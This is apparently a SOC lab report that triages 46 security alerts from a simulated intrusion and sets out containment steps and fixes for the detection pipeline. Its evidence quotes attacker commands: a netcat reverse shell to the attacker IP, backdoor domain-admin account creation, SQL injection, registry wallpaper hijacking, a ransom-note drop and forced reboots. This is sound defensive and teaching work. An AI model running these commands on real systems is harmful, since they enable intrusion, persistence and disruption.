**What happened & why (Consolidating #39 with its two reg.exe child alerts #40 & #41):** On DomainWin10 (PC-DC.ad.lab), the entire 9-step destructive sequence is captured as 9 sub-events inside a single fan-out alert—**#39 ([FANOUT x9] [DomainWin10] parent PID 4432)**—while #40 (parent PID 6500) and #41 (parent PID 4980) are simply secondary Wazuh rule `92041` alerts (**Value added to registry key has Base64-like pattern**) triggered by the two `reg.exe` child processes spawned during Alert 4 and Alert 5 of #39. Inside #39, the exact sequence executed via wmiexec.py (parent PID 4432) is:

1. **Session Init (Alert 1 & Alert 2):** Runs `cd \` and `cd`.
2. **Staging the Wallpaper Image (Alert 3):** Runs:
   ```cmd
   cmd /c "copy C:\Windows\Temp\hacked.bmp C:\Users\Public\hacked.bmp"
   ```
3. **Registry Wallpaper Hijack (Alert 4 & Alert 5, which also trigger #40 & #41):** There is no `rundll32.exe` call anywhere in this sequence; instead, the attacker runs two `reg add` commands against `HKCU\Control Panel\Desktop`:
   ```cmd
   cmd /c "reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d C:\Users\Public\hacked.bmp /f"
   ```
   (Alert 4 / #40)
   ```cmd
   cmd /c "reg add "HKCU\Control Panel\Desktop" /v WallpaperStyle /t REG_SZ /d 2 /f"
   ```
   (Alert 5 / #41)
4. **Ransom Note Drop (Alert 6):** Writes the exact message **YOU HAVE BEEN HACKED. Contact: eclipse@manic | eclipsemanic.me** to `C:\Users\Administrator\Desktop\README_HACKED.txt`:
   ```cmd
   cmd /c "echo YOU HAVE BEEN HACKED. Contact: eclipse@manic ^| eclipsemanic.me > C:\Users\Administrator\Desktop\README_HACKED.txt"
   ```
5. **Simulated .enc File Drops (Alert 7 & Alert 8):** Writes `ENCRYPTED_DATA_XOR_KEY_7f3a9b` to `C:\Users\Administrator\Desktop\documents.enc` and `C:\Users\Administrator\Desktop\passwords.enc`.
6. **Forced Server Reboot (Alert 9):** Executes `cmd /c "shutdown /r /t 0"` at `18:20:56 IST`, forcing the Domain Controller to reboot immediately.

![Alert #42: Win10 Registry Wallpaper Hijack](Screenshot/Initial%20triage%20and%20investigation%20-%20screenshot/slot_10_alert42_win10_wallpaper_registry.png)
*Figure 10a: Alert #42 sub-events 3–5 showing copy of hacked.bmp to C:\Users\Public\ and reg add Wallpaper/WallpaperStyle commands.*

![Alert #42: Win10 Ransomware Drop and Forced Reboot](Screenshot/Initial%20triage%20and%20investigation%20-%20screenshot/slot_10_alert42_win10_ransomware_and_reboot.png)
*Figure 10b: Alert #42 sub-events 6–9 showing README_HACKED.txt drop, .enc file creation, and shutdown /r /t 0.*

### Phase 6B: Consolidated 9-Step Impact Batch on Win10User & Supporting NTLM Context (18:23:58 – 18:24:32 IST)

| Alert | Time (IST) | Title |
|-------|-----------|-------|
| **#42** | 18:23:59 | [FANOUT x9] [Win10User] parent PID 4008 |
| **#43** | 18:23:59 | [3x] [Suricata] Suricata: Alert - ET INFO NTLM Session Setup Request - Negotiate |
| **#44** | 18:24:12 | [FANOUT x1] [Win10User] parent PID 1724 |
| **#45** | 18:24:18 | [FANOUT x1] [Win10User] parent PID 3880 |

**What happened & why:**

**Consolidated 9-Step Batch on Win10User (#42, plus reg.exe child alerts #44 & #45):** Just like on the DC, all 9 destructive commands on Win10.ad.lab are sub-events inside #42 ([FANOUT x9] [Win10User] parent PID 4008), while #44 (parent PID 1724) and #45 (parent PID 3880) are the two rule-`92041` registry alerts from `reg.exe`. In #42, the attacker copies `C:\Windows\Temp\hacked.bmp` to `C:\Users\Public\hacked.bmp`, runs the same two `reg add` commands (Wallpaper and WallpaperStyle), writes **YOU HAVE BEEN HACKED. Contact: eclipse@manic | eclipsemanic.me** to `C:\Users\win10\Desktop\README_HACKED.txt`, drops `C:\Users\win10\Desktop\documents.enc` and `passwords.enc`, and runs `shutdown /r /t 0`.

**Evaluating Alert #43 (ET INFO NTLM Session Setup Request - Negotiate):** At `18:23:58.413 IST` (one second before #42 begins), Suricata logs 3 packets (**NTLM Negotiate**, **NTLMv1 Challenge**, and **NTLM Auth**) on flow `192.168.56.30:32922 <-> 192.168.56.20:445`. Because an **ET INFO NTLM Session Setup Request** signature only proves that NTLM authentication traffic occurred on port 445—not the inner RPC/WMI payload—I hold #43 as **supporting network context** for the DVWA -> Win10 pivot theory, correlated by timestamp with #42.

### Phase 6C: Post-Reboot Domain Controller Event Confirming AD\backdoor Survived (18:36:34 IST)

> ### 🔴 Alert #46 (`18:36:34 IST`) — [1x] [DomainWin10] Logon activity: BACKDOOR @ local

**What happened & why:** Fifteen minutes after PC-DC rebooted, Wazuh rule `60110` (**User account changed**, Windows Event ID 4738) logs a post-boot account notification on **BACKDOOR** (SID `...-4192`)—confirming the Domain Controller is back online and **the rogue AD\backdoor account is still active right now**.

![Alert #46: Surviving AD\backdoor Account Post-Reboot](Screenshot/Initial%20triage%20and%20investigation%20-%20screenshot/slot_10.5_alert46_post_reboot_backdoor.png)
*Figure 10.5: Alert #46 detail showing Windows Security Event ID 4738 confirming user backdoor active on DomainWin10 15 minutes after server reboot.*

### ✅ Window 6 Verdict & Real Priority

| Alert | Verdict | TheHive Sev | My Real Priority |
|-------|---------|-------------|------------------|
| **#39, #40, #41, #42, #44, #45, #46** | Confirmed True Positives (Simulated Ransomware/Defacement Impact, Forced Reboots & Surviving Backdoor) | Medium | **Critical (P1)** |
| **#43** | Confirmed True Positive (Supporting NTLM Pivot Context) | Medium | **High (P2)** |

---

# 3. Master Triage Table: All 46 Alerts

> **With Verbatim Titles, Priorities & Verdicts**

| # | IST Time | Verbatim TheHive Alert Title | Host / Sensor | TheHive Sev | Real Priority | Verdict | Key Evidence & Next Verification Step |
|---|----------|------------------------------|-------------|-------------|---------------|---------|----------------------------------------|
| #01 | 17:10:09 | [2x] [Suricata] Suricata: Alert - POSSBL SCAN SHELL M-SPLOIT TCP | Suricata | Medium | Info (P4) | **FP (Shell)** | Nmap SYN probe (`src_port: 34938`) to closed port 4444 (`pkts_toclient: 0`). |
| #02 | 17:10:09 | [TOOL:unknown-scanner x17] [Suricata] 192.168.232.135 | Suricata | Medium | Low (P4) | **Confirmed TP (Recon)** | **Unbounded 69m bundle** (`17:10:09 – 18:19:03 IST`) across ports 22, 80, 1433, 1521, 3306, 3389, 5432, 5815. |
| #03 | 17:10:09 | [TOOL:Nmap x3] [Suricata] 192.168.232.135 | Suricata | High | Low (P4) | **Confirmed TP (Recon)** | Signatures POSSBL PORT SCAN (NMAP -sS) & ET SCAN NMAP OS Detection Probe (`86601`). |
| #04 | 17:12:05 | [2x] [DVWA] DVWA: Multiple 400 errors - [404] [192.168.232.135] [/udOIY0cZ.fhp] | DVWA | Medium | Low (P4) | **Confirmed TP (Recon)** | Two 404 hits on nonsense `/udOIY0cZ.fhp` path (Nikto fuzzer check, rule `31151`). |
| #05 | 17:12:08 | [1x] [Suricata] Suricata: High-volume HTTP 4xx burst from 192.168.232.135... | Suricata | Medium | Low (P4) | **Confirmed TP (Recon)** | Rule `100410` flagging >100 in 60s HTTP 4xx Nikto enumeration burst. |
| #06 | 17:12:08 | [5x] [DVWA] Shellshock attack detected | DVWA | Critical | Low (P4) | **Confirmed FP (Exploit)** | Nikto `93e4r0-CVE-2014-6271: true` canary header on PHP pages; no execution. |
| #07 | 17:12:09 | [16x] [DVWA] Multiple common web attacks from same source ip. | DVWA | Medium | Low (P4) | **Confirmed TP (Recon)** | 16 Nikto probes (rule `31153`), including buried `rfiinc.txt%00` RFI test (404). |
| #08 | 17:12:09 | [WATCHLIST x14: passwd] [DVWA] 192.168.232.135 | DVWA | Medium | Low (P4) | **Confirmed TP (Recon)** | 14 Nikto path-traversal probes matching passwd watchlist (rule `31153`, all failed). |
| #09 | 17:12:10 | [26x] [DVWA] Multiple XSS (Cross Site Scripting) attempts from same source ip. | DVWA | Medium | Low (P4) | **Confirmed TP (Recon)** | 26 Nikto XSS probes (rule `31154`), all unauthenticated/failed. |
| #10 | 17:12:16 | [4x] [Suricata] Suricata: Alert - GPL EXPLOIT unicode directory traversal attempt | Suricata | Medium | Low (P4) | **Confirmed TP (Recon)** | 4 Nikto `%2e%2e/` traversal probes (rule `86601`). |
| #11 | 17:18:02 | [22x] [Suricata] Suricata: [200] [192.168.232.135] [/login.php] [ET INFO User-Agent...] | Suricata | Medium | Critical (P1) | **Suspected Brute-Force / Confirmed SQLi & Upload** | 14 GET /login.php -> 2 GET /index.php (pull host auth log to confirm POST); 1 UNION SELECT SQLi (Alert 17); shell.php upload & ?cmd=id (Alert 18–22). |
| #12 | 17:21:53 | [FANOUT x1] [DVWA] parent PID 17550 | DVWA | Medium | High (P2) | **Confirmed TP (RCE)** | Host auditd logs `uid=33` (www-data) executing `/usr/bin/id`. |
| #13 | 17:21:58 | [1x] [Suricata] Suricata: Alert - ET ATTACK_RESPONSE Output of id command... | Suricata | Medium | High (P2) | **Confirmed TP (RCE)** | HTTP response returning `uid=33(www-data)` to 192.168.232.135. |
| #14 | 17:24:03 | [5x] [Suricata] Suricata: Alert - POSSBL SCAN SHELL M-SPLOIT TCP | Suricata | Medium | Critical (P1) | **Confirmed TP (Shell)** | Live reverse shell flow `192.168.56.30:47946 -> 192.168.232.135:4444`. |
| #15 | 17:24:03 | [FANOUT x1] [DVWA] parent PID 17562 | DVWA | Medium | Critical (P1) | **Confirmed TP (Shell)** | Host auditd logs `/usr/bin/nc.openbsd` (`mkfifo /tmp/f...nc 192.168.232.135 4444`). |
| #16 | 17:29:43 | [2x] [DVWA] Logon activity: ROOT @ 192.168.232.135 | DVWA | Medium | Critical (P1) | **Confirmed TP (Root SSH)** | `Accepted publickey for root from 192.168.232.135 port 36488 ssh2: ED25519 SHA256:sMGVpOuq...` |
| #17 | 17:30:49 | [TOOL:Nmap x9] [Suricata] 192.168.56.30 | Suricata | High | High (P2) | **Confirmed TP (Pivot Scan)** | Signatures POSSBL PORT SCAN (NMAP -sS) & (NMAP -sX) across ports 1, 111, 199, 31768, 443, 995. |
| #18 | 17:30:51 | [5x] [Suricata] Suricata: Alert - POSSBL SCAN SHELL M-SPLOIT TCP | Suricata | Medium | Info (P4) | **FP (Shell)** | Triggered when DVWA's internal Nmap scan probed port 4444. |
| #19 | 17:32:16 | [TOOL:unknown-scanner x14] [Suricata] 192.168.56.30 | Suricata | Medium | High (P2) | **Confirmed TP (Pivot Scan)** | 14 hits of ET SCAN Potential SSH Scan OUTBOUND on port 22 from 192.168.56.30. |
| #20 | 17:34:27 | [4x] [DVWA] Logon activity: ROOT @ 192.168.232.135 | DVWA | Medium | High (P2) | **Confirmed TP (Root SSH)** | 4 succeeded root SSH publickey events from 192.168.232.135. |
| #21 | 17:39:46 | [2x] [DVWA] Logon activity: ROOT @ 192.168.232.135 | DVWA | Medium | High (P2) | **Confirmed TP (Root SSH)** | 2 succeeded root SSH publickey events from 192.168.232.135. |
| #22 | 18:01:02 | [2x] [DVWA] Logon activity: ROOT @ 192.168.232.135 | DVWA | Medium | High (P2) | **Confirmed TP (Root SSH)** | 2 succeeded root SSH publickey events 16s before GoldenPac alert #23. |
| #23 | 18:01:18 | [1x] [Suricata] Suricata: Alert - ET EXPLOIT Possible GoldenPac Priv Esc in-use | Suricata | Medium | Critical (P1) | **Suspected / High-Confidence TP** | Flow `192.168.56.30:33986 -> 192.168.56.10:88` (krb5); pattern-consistent with MS14-068 (pull PCAP to verify PAC). |
| #24 | 18:03:52 | [2x] [DVWA] Logon activity: ROOT @ 192.168.232.135 | DVWA | Medium | High (P2) | **Confirmed TP (Root SSH)** | 2 succeeded root SSH publickey events on DVWA. |
| #25 | 18:04:47 | [FANOUT x2] [DomainWin10] parent PID 4432 | DomainWin10 | Medium | Critical (P1) | **Confirmed TP (DC WMI)** | Rule `100613`: Impacket wmiexec detected (AD\Administrator, `cd \` & `cd`). |
| #26 | 18:05:43 | [FANOUT x2] [DomainWin10] parent PID 4432 | DomainWin10 | Medium | Critical (P1) | **Confirmed TP (DC WMI)** | wmiexec.py (PID 4432) runs `whoami` and `hostname` on PC-DC.ad.lab. |
| #27 | 18:06:53 | [FANOUT x2] [DomainWin10] parent PID 4432 | DomainWin10 | Medium | Critical (P1) | **Confirmed TP (DC WMI)** | wmiexec.py (PID 4432) session init (`cd \` & `cd`) on PC-DC.ad.lab. |
| #28 | 18:07:26 | [FANOUT x2] [DomainWin10] parent PID 4432 | DomainWin10 | Medium | Critical (P1) | **Confirmed TP (DC WMI)** | wmiexec.py (PID 4432) runs `whoami` and `hostname` on PC-DC.ad.lab. |
| #29 | 18:08:21 | [FANOUT x3] [DomainWin10] parent PID 4432 | DomainWin10 | Medium | Critical (P1) | **Confirmed TP (DC Backdoor)** | Runs `net user backdoor P@ssw0rd123! /add`, `net localgroup Administrators backdoor /add`, and failed curly-quote `net group "Domain Admins"`. |
| #30 | 18:08:22 | [3x] [DomainWin10] Logon activity: BACKDOOR @ local | DomainWin10 | Medium | Critical (P1) | **Confirmed TP (User Added)** | Rule `60109` (Event IDs 4720/4722/4738) confirming AD\backdoor creation. |
| #31 | 18:08:27 | [1x] [DomainWin10] Logon activity: ADMINISTRATORS @ local | DomainWin10 | High | Critical (P1) | **Confirmed TP (Admin Group)** | Rule `60154` (Event ID 4732) confirming CN=backdoor added to Administrators. |
| #32 | 18:09:05 | [FANOUT x3] [DomainWin10] parent PID 4432 | DomainWin10 | Medium | Critical (P1) | **Confirmed TP (DomAdmin Cmd)** | Runs ASCII-quote `net group "Domain Admins" backdoor /add`, `net user backdoor /passwordchg:no`, and `net user backdoor`. |
| #33 | 18:09:05 | [1x] [DomainWin10] Logon activity: DOMAIN ADMINS @ local | DomainWin10 | High | Critical (P1) | **Confirmed TP (Domain Admin)** | Rule `60159` (Event ID 4728) confirming CN=backdoor added to Domain Admins. |
| #34 | 18:09:28 | [2x] [DomainWin10] Logon activity: BACKDOOR @ local | DomainWin10 | Medium | High (P2) | **Confirmed TP (Policy Lock)** | Rule `60110` (Event ID 4738) confirming `/passwordchg:no` applied to backdoor. |
| #35 | 18:13:58 | [FANOUT x2] [DomainWin10] parent PID 4432 | DomainWin10 | Medium | High (P2) | **Confirmed TP (AD Staging)** | Dumps `net user /domain > C:\Windows\Temp\domain_users.txt` & `whoami /all > admin_info.txt`. |
| #36 | 18:14:58 | [FANOUT x3] [Win10User] parent PID 4008 | Win10User | Medium | High (P2) | **Confirmed TP (Lateral)** | wmiexec.py (PID 4008) on Win10.ad.lab runs `type C:\Users\win10\Documents\Sensitive\* > C:\Windows\Temp\sensitive_data.txt`. |
| #37 | 18:17:30 | [6x] [DVWA] Logon activity: ROOT @ 192.168.232.135 | DVWA | Medium | High (P2) | **Confirmed TP (SSH Reconnect)** | 6 rapid root SSH logins on DVWA (session re-establishment; no scp/sftp indicator in log). |
| #38 | 18:19:02 | [2x] [DVWA] Logon activity: ROOT @ 192.168.232.135 | DVWA | Medium | High (P2) | **Confirmed TP (SSH Reconnect)** | 2 root SSH logins on DVWA 47s before launching Window 6 impact commands. |
| #39 | 18:19:49 | [FANOUT x9] [DomainWin10] parent PID 4432 | DomainWin10 | Medium | Critical (P1) | **Confirmed TP (DC Impact)** | Consolidated 9-step batch: copies hacked.bmp to `C:\Users\Public\`, runs 2 reg add wallpaper commands, writes README_HACKED.txt & .enc files to `C:\Users\Administrator\Desktop\`, runs `shutdown /r /t 0`. |
| #40 | 18:20:05 | [FANOUT x1] [DomainWin10] parent PID 6500 | DomainWin10 | Medium | Critical (P1) | **Confirmed TP (Child of #39)** | Rule `92041` child alert triggered by reg.exe (Alert 4 inside #39). |
| #41 | 18:20:11 | [FANOUT x1] [DomainWin10] parent PID 4980 | DomainWin10 | Medium | Critical (P1) | **Confirmed TP (Child of #39)** | Rule `92041` child alert triggered by reg.exe (Alert 5 inside #39). |
| #42 | 18:23:59 | [FANOUT x9] [Win10User] parent PID 4008 | Win10User | Medium | Critical (P1) | **Confirmed TP (Win10 Impact)** | Consolidated 9-step batch on Win10User: copies hacked.bmp, runs 2 reg add commands, writes README_HACKED.txt & .enc files to `C:\Users\win10\Desktop\`, runs `shutdown /r /t 0`. |
| #43 | 18:23:59 | [3x] [Suricata] Suricata: Alert - ET INFO NTLM Session Setup Request - Negotiate | Suricata | Medium | High (P2) | **Confirmed TP (Pivot Context)** | NTLM Negotiate/Challenge/Auth (`192.168.56.30:32922 <-> 192.168.56.20:445`); supporting context for DVWA -> Win10 pivot. |
| #44 | 18:24:12 | [FANOUT x1] [Win10User] parent PID 1724 | Win10User | Medium | Critical (P1) | **Confirmed TP (Child of #42)** | Rule `92041` child alert triggered by reg.exe (Alert 4 inside #42). |
| #45 | 18:24:18 | [FANOUT x1] [Win10User] parent PID 3880 | Win10User | Medium | Critical (P1) | **Confirmed TP (Child of #42)** | Rule `92041` child alert triggered by reg.exe (Alert 5 inside #42). |
| #46 | 18:36:34 | [1x] [DomainWin10] Logon activity: BACKDOOR @ local | DomainWin10 | Medium | Critical (P1) | **Confirmed TP (Live Backdoor)** | Post-reboot Event ID 4738 check (rule `60110`) confirming AD\backdoor survived reboot. |

---

# 4. Immediate Containment Actions & Why I Am Taking Each One Right Now

Before I start a deep forensic investigation to write up Cases 01, 02, and 03, I have to **lock the attacker out**. If I leave their Critical (P1) footholds open while I spend hours analyzing logs, they can log right back in, wipe evidence, or deploy real ransomware. Even more importantly, **the sequence of containment matters**: if I delete their webshell or AD\backdoor account before cutting off their network access, the attacker can see my cleanup in real time and plant a second hidden backdoor.

## 🛡️ Action 1: Block Attacker IP 192.168.232.135 at the Firewall & Cut DVWA's Internal Pivot Bridge (192.168.56.30)

### Why I am doing this first (The Reasoning):

Every external attack in the queue—from the python-requests session (#11) and the port 4444 reverse shell (#14 – #15) to all root SSH logins (#16, #20 – #22, #24, #37, #38)—originated from `192.168.232.135`. Alerts #17 (Internal Nmap), #19 (Outbound SSH Scan), #23 (Kerberos traffic `.56.30 -> .56.10:88`), and #43 (NTLM Session Setup `.56.30 <-> .56.20:445`) show that **DVWA (`192.168.56.30`) is acting as the internal jump box into Active Directory**.

### What I am executing immediately:

- **Block all inbound and outbound traffic to/from `192.168.232.135`** at the perimeter firewall (especially TCP `:22` SSH, `:80` HTTP, and `:4444`).
- **Isolate DVWA (`192.168.56.30`)** by blocking outbound connections from `.56.30` to `192.168.56.10` (PC-DC) and `192.168.56.20` (Win10) on ports `:88` (Kerberos), `:445` (SMB), and `:135` (RPC/WMI). This blinds the attacker immediately before I touch a single file on the hosts.

## 🛡️ Action 2: Remove the Rogue Root SSH Key, Kill Live Shells & Quarantine shell.php on DVWA (192.168.56.30)

### Why I am doing this (The Reasoning):

On DVWA, the attacker established **three independent ways in**. If I only delete shell.php, they can still log straight in as root via SSH (#16) or use their open Netcat shell (#15). Conversely, if I only remove the SSH key, they can re-run commands through shell.php (#11). **I must close all three simultaneously while preserving copies for forensic analysis.**

### What I am executing on DVWA:

- **Remove Root SSH Persistence (#16):** Copy `/root/.ssh/authorized_keys` to `/root/forensics_authorized_keys.bak` (preserving metadata/timestamps for Case 01), then delete the line containing `ED25519 SHA256:sMGVpOuqXdgB9Cqa5JCKAmoz51G5mwbkEUAxSngg4hE`.
- **Kill Active Attacker Processes (#14 – #15):** Terminate any active `sshd: root@...` sessions from `192.168.232.135` (such as port 36488), kill any `/usr/bin/nc.openbsd` (`nc 192.168.232.135 4444`) or `/bin/sh -i` processes, and remove the named pipe `rm -f /tmp/f`.
- **Quarantine the Webshell (#11):** Move `/var/www/html/hackable/uploads/shell.php` out of the web root to `/root/forensics_shell.php.quarantine` (`chmod 000`) so Apache (www-data) can no longer execute `?cmd=` requests.

## 🛡️ Action 3: Disable AD\backdoor, Strip Its Admin Groups & Twice-Reset krbtgt on DomainWin10 (192.168.56.10)

### Why I am doing this (The Reasoning):

**Why I disable AD\backdoor instead of deleting it (#29 – #34, #46):** If I run `net user backdoor /del` right now, Active Directory deletes the user object and its SID (`S-1-5-21-...-4192`) before I finish correlating Velociraptor and Security Event logs. By disabling AD\backdoor and removing it from Domain Admins and Administrators, I revoke its access 100% while preserving every forensic artifact.

**Why resetting AD\Administrator alone is NOT enough (#23 GoldenPac & #25 wmiexec.py):** Because Alert #23 indicates high-confidence GoldenPac (MS14-068) Kerberos ticket forgery and #25 confirms wmiexec.py running as AD\Administrator, **any forged Kerberos Ticket-Granting Ticket (TGT) signed by krbtgt remains valid for up to 10 hours even if AD\Administrator's password is changed!** To invalidate all forged Kerberos tickets across the domain, I must reset the krbtgt password **twice** (since Active Directory keeps a 2-password history for krbtgt) and purge Kerberos ticket caches (`klist purge`).

### What I am executing on PC-DC.ad.lab:

```cmd
net user backdoor /active:no /domain
net group "Domain Admins" backdoor /del /domain
net localgroup Administrators backdoor /del
```

*(Followed immediately by rotating AD\Administrator's password, resetting krbtgt twice, and running `klist purge`.)*

## 🛡️ Action 4: Terminate WMI/SMB Sessions on Win10User (192.168.56.20) & Quarantine Staged Files on Both Windows Hosts

### Why I am doing this (The Reasoning):

In Alerts #35 and #36, the attacker dumped sensitive AD and workstation data into `C:\Windows\Temp\domain_users.txt`, `admin_info.txt`, and `sensitive_data.txt`. And in #39 and #42, they copied hacked.bmp to `C:\Users\Public\hacked.bmp`, modified `HKCU\Control Panel\Desktop` (Wallpaper and WallpaperStyle), and wrote README_HACKED.txt, documents.enc, and passwords.enc onto `C:\Users\Administrator\Desktop\` (on the DC) and `C:\Users\win10\Desktop\` (on Win10User).

### What I am executing:

- Kill any lingering `WmiPrvSE.exe` child `cmd.exe` processes (parent PID 4432 on DC, parent PID 4008 on Win10)
- Close active SMB sessions (`net session /delete`)
- Move the staged `.txt`, `C:\Users\Public\hacked.bmp`, `README_HACKED.txt`, and `.enc` files into a secure forensic evidence folder
- Restore `HKCU\Control Panel\Desktop` (Wallpaper and WallpaperStyle)

## 🛡️ Action 5: Rotate DVWA Web Application & Database Passwords (#11)

### Why I am doing this (The Reasoning):

Because the attacker dumped the MySQL `users` table via `UNION SELECT user, password FROM users-- -` (Alert 17 in #11) after the suspected `/login.php` brute-force (Alert 1 – 16), I must rotate all DVWA application passwords and MariaDB/MySQL database credentials before bringing the web application back online.

---

# 5. Analyst Critique of Our Alert Creation Pipeline (custom-thehive.py & Wazuh Rules): 8 Flaws to Fix

Reviewing these 46 alerts as an analyst exposed **eight major engineering flaws** in how our lab (`custom-thehive.py`, Wazuh `local_rules.xml`, and Suricata) currently generates, titles, tags, and prioritizes alerts in TheHive:

## ⚠️ Flaw 1: Upside-Down Severity Mapping (Scanner Noise Marked Critical, Active Breaches Marked Medium)

### What went wrong:

Our pipeline maps Wazuh `rule.level` directly to TheHive severity using static thresholds (`level >= 12` → Critical, `9–11` → High, `5–8` → Medium). Because default rules assign level 5–8 to Impacket wmiexec detected (`100613`), Linux auditd (`80792`), SSH logins (`5715`), and Suricata exploit/response rules (`86601`), **the worst attacks in the entire incident were buried as Medium**:

- **False Critical / High:** Failed Nikto Shellshock header (#06 = Critical) and external Nmap scan (#03 = High).
- **False Medium (Should be Critical):** Web SQLi + shell.php upload (#11), Netcat reverse shell (#14 – #15), root SSH login from attacker IP (#16), GoldenPac DC exploit (#23), wmiexec.py on DC (#25 – #29, #32), BACKDOOR user creation (#30), and simulated ransomware + forced reboots (#39 – #45).

### How to fix it:

Promote Wazuh rule `100613` (Impacket wmiexec detected), `mkfifo / nc.openbsd` reverse shells, ET EXPLOIT GoldenPac, Event ID 4720 (`60109` add_user on DC), and `shutdown /r` / `.enc` file drops to **Critical (Sev 4)**, and downgrade unauthenticated scanner 404 / 400 bursts to **Low (Sev 1)**.

## ⚠️ Flaw 2: Missing [TOOL:...] Detection Tags (Only Nmap Was Named; Everything Else Was Missed or Tagged unknown-scanner)

### What went wrong:

While #03 and #17 were tagged `[TOOL:Nmap]`, #02 and #19 were tagged `[TOOL:unknown-scanner]`, and the pipeline failed to tag `[TOOL:...]` on the other attack tools even when Wazuh/Suricata already knew the tool name:

- **Missed [TOOL:Nikto] (#04 – #10):** Raw HTTP logs explicitly contained `Mozilla/5.00 (Nikto/2.1.6)`.
- **Missed [TOOL:Impacket-wmiexec] (#25 – #29, #32, #35, #36, #39, #42):** Inside the description, Wazuh rule `100613` literally says **Impacket wmiexec detected**, yet `custom-thehive.py` overwrote the alert title with `[FANOUT x...] parent PID 4432` and dropped the Impacket wmiexec label from the title!
- **Missed [TOOL:Impacket-GoldenPac] (#23) & [TOOL:Netcat] (#15).**

### How to fix it:

Update `custom-thehive.py` so `[FANOUT]` title formatting preserves high-value rule names like Impacket wmiexec detected (`[TOOL:Impacket-wmiexec]`) and matches `Nikto/2.1.6` in `http_user_agent`.

## ⚠️ Flaw 3: Misleading & Opaque Alert Titles ([FANOUT] parent PID & Group-Name Inversion)

### What went wrong:

- **[FANOUT x...] parent PID 4432 Hides Impacket wmiexec and the Executed Commands (#12, #15, #25 – #29, #32, #35, #36, #39 – #42, #44 – #45):** Seventeen alerts in the queue have titles like `[FANOUT x2] [DomainWin10] parent PID 4432` or `[FANOUT x1] [DVWA] parent PID 17562`. That tells an analyst nothing at first glance, even though the underlying events contain the exact binary (`/usr/bin/nc.openbsd`, `/usr/bin/id`, `reg.exe`) and the exact `commandLine`!
- **Windows Group Changes Show the Group Name Instead of the Added User (#31, #33):** `[1x] [DomainWin10] Logon activity: DOMAIN ADMINS @ local` pulls `targetUserName` (DOMAIN ADMINS) instead of `memberName` (CN=backdoor).

### How to fix it:

Include `distinct_images` and the first/highest-severity `commandLine` in `[FANOUT]` titles, and format 4728 / 4732 titles as `Group Change: Added <memberName> to <targetUserName>`.

## ⚠️ Flaw 4: Over-Broad Alert Grouping (#11 Buried 4 Kill-Chain Stages Under a GET /login.php Title)

### What went wrong:

In Alert #11, `custom-thehive.py` bundled 22 events across almost 4 minutes (`17:18:02` to `17:21:54 IST`) because they all fired Wazuh wrapper rule `100600`, and named the entire bundle after the very first event (`[200] [192.168.232.135] [/login.php] [ET INFO User-Agent (python-requests)]`). That buried **ET WEB_SERVER SELECT USER SQL Injection Attempt in URI** (Alert 17), **ET WEB_SERVER PHP System Command in HTTP POST** (Alert 20 – 21), and **ET WEB_SERVER Exploit Suspected PHP Injection Attack (cmd=)** (Alert 22) inside an informational User-Agent alert!

### How to fix it:

Group Suricata web alerts by `(src_ip, alert.signature_id)` rather than wrapper rule `100600`, and always title/score a bundle using its **highest-severity signature**.

## ⚠️ Flaw 5: Broken Auto-Tagging (T1047 WMI on Linux SSH & stages:N Event Counters)

### What went wrong:

Whenever `process_fanout` or multi-event grouping triggered, `custom-thehive.py` attached MITRE **T1047** (Windows Management Instrumentation) even to Ubuntu Linux sshd / auditd events and Windows Event ID 4738 account modifications, and used `stages:N` (`stages:22`, `stages:16`) to represent the sub-event hit count rather than kill-chain stage numbers.

### How to fix it:

Restrict T1047 strictly to Windows events where `parentImage` / `parentProcessName` is `WmiPrvSE.exe`, and rename `stages:N` to `events:N` or `hits:N`.

## ⚠️ Flaw 6: Host & Network Visibility Blind Spots (Linux Privesc & Initial DC SMB Pivot)

### What went wrong:

- **Zero alerts fired during the 5m 40s Linux privilege escalation gap** (`17:24:03 – 17:29:43 IST`) where www-data escalated to root and wrote `/root/.ssh/authorized_keys`
- **Zero Suricata alerts fired when DVWA first connected to PC-DC:445** to launch wmiexec.py at `18:04:47 IST`

### How to fix it:

Add auditd `euid=0` privesc rules + Wazuh `realtime="yes"` FIM on `/root/.ssh/authorized_keys`, and ensure Suricata monitors `.56.30 <-> .56.10:445`.

## ⚠️ Flaw 7: No Visibility into POST-Based Login Activity on /login.php (Alert #11)

### What went wrong:

Every event tied to the credential-access attempt in Alert #11 logs as **GET** under Suricata rule `100600`, which matches on User-Agent (python-requests) rather than HTTP method or request body. If the actual brute-force traffic went over POST—the far more likely mechanism for submitting credentials—this pipeline has no rule capturing it, and the alert queue alone cannot confirm what credential pair was submitted or whether authentication succeeded.

### How to fix it:

Add a dedicated detection rule keyed on **POST /login.php** with response-size, `302` redirect `Location`, or session-cookie heuristics, and ingest DVWA's own host-side Apache access/application auth logs into Wazuh so credential-access attempts aren't solely dependent on Suricata's network-layer User-Agent view.

## ⚠️ Flaw 8: Unbounded Alert Correlation Time Window (Alert #02 Absorbed Sub-Events for 69 Minutes)

### What went wrong:

Alert #02's Time span metadata (`17:10:09.913 IST` → `18:19:03.500 IST`) shows that the correlation engine kept appending sub-events from `192.168.232.135` into this single "scanner" bundle for **69 minutes across the entire incident**—long after the webshell upload (#11), the Netcat reverse shell (#14 – #15), and the root SSH access (#16, #20 – #22, #24, #37, #38) had already occurred. Post-compromise traffic from the same source IP keeps being filed under a Window 1 recon alert, so an analyst working the queue by time window never sees that the same source remained active throughout the entire attack chain.

### How to fix it:

Bound the correlation window in `custom-thehive.py`: close a grouped alert after a fixed timeout (e.g., 5–10 minutes without new sub-events) and split the bundle whenever the gap between sub-events exceeds a threshold, so post-compromise activity from the same source lands in a fresh, correctly-prioritized alert instead of silently extending a stale scanner bundle.

---

> 📄 **Document Source:** `SOC_Lab_First_Glance_Alert_Triage_and_Containment.pdf` (12 pages)
> **Converted to Markdown with full content preservation & enhanced formatting**
